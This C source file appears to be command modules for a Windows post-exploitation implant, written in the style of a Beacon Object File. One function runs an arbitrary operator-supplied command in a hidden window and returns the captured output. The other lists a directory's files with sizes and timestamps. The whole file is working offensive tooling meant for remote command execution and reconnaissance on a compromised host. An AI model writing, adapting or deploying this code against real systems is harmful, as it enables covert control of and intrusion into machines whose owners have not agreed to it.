#include "FuncDecl.h"

// 执行 CMD 命令
void ExecuteCmd$$(char** pCommandPara, int commandParaLength, char** pOutputData, int* pOutputDataLength, PVOID* specialParaList) {
    *pOutputData = (char*)MSVCRT$malloc(130);
    MSVCRT$sprintf_s(*pOutputData, 130, "%s", "[-] CMD Failed.");
    *pOutputDataLength = 15;

    HANDLE hRead, hWrite;
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
    if (!Kernel32$CreatePipe(&hRead, &hWrite, &sa, 0)) {
        return;
    }

    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi;
    si.cb = sizeof(STARTUPINFOA);
    si.hStdError = hWrite;
    si.hStdOutput = hWrite;
    si.wShowWindow = SW_HIDE;
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    if (!Kernel32$CreateProcessA(NULL, *pCommandPara, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        Kernel32$CloseHandle(hRead);
        Kernel32$CloseHandle(hWrite);
        return;
    }
    Kernel32$CloseHandle(hWrite);
    Kernel32$CloseHandle(pi.hThread);
    Kernel32$CloseHandle(pi.hProcess);

    MSVCRT$sprintf_s(*pOutputData, 130, "%s", "[+] Run Successful.\n");
    *pOutputDataLength = 20;
    DWORD currentReadLength;
    do {
        Kernel32$ReadFile(hRead, *pOutputData + *pOutputDataLength, 100, &currentReadLength, NULL);
        *pOutputDataLength += currentReadLength;
        *pOutputData = (char*)MSVCRT$realloc(*pOutputData, *pOutputDataLength + 100);
    } while (currentReadLength != 0);

    Kernel32$CloseHandle(hRead);
}

// 获取文件信息列表
void GetFileInfoList$$(char** pCommandPara, int commandParaLength, char** pOutputData, int* pOutputDataLength, PVOID* specialParaList) {
    *pOutputData = (char*)MSVCRT$malloc(330);
    MSVCRT$sprintf_s(*pOutputData, 330, "%s", "[-] GetFileInfoList Failed.");
    *pOutputDataLength = 27;

    WIN32_FIND_DATAA findData;
    HANDLE hFind = Kernel32$FindFirstFileA(*pCommandPara, &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        if (!Kernel32$GetFullPathNameA(*pCommandPara, MAX_PATH, *pOutputData, NULL)) {
            Kernel32$FindClose(hFind);
            return;
        }
        do {
            if (*findData.cFileName != '.') {
                FILETIME localFileTime;
                if (!Kernel32$FileTimeToLocalFileTime(&findData.ftLastWriteTime, &localFileTime)) {
                    Kernel32$FindClose(hFind);
                    break;
                }
                SYSTEMTIME systemTime;
                if (!Kernel32$FileTimeToSystemTime(&localFileTime, &systemTime)) {
                    Kernel32$FindClose(hFind);
                    break;
                }
                char format[] = "\n%d,%s,%llu,%04d.%02d.%02d %02d:%02d:%02d";
                MSVCRT$sprintf_s(*pOutputData + MSVCRT$strlen(*pOutputData), 330, format, (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? 1 : 0, findData.cFileName, ((ULONGLONG)findData.nFileSizeHigh << 32) | findData.nFileSizeLow, systemTime.wYear, systemTime.wMonth, systemTime.wDay, systemTime.wHour, systemTime.wMinute, systemTime.wSecond);
                *pOutputData = (char*)MSVCRT$realloc(*pOutputData, MSVCRT$strlen(*pOutputData) + 330);
            }
        } while (Kernel32$FindNextFileA(hFind, &findData));
    }
    *pOutputDataLength = MSVCRT$strlen(*pOutputData);
}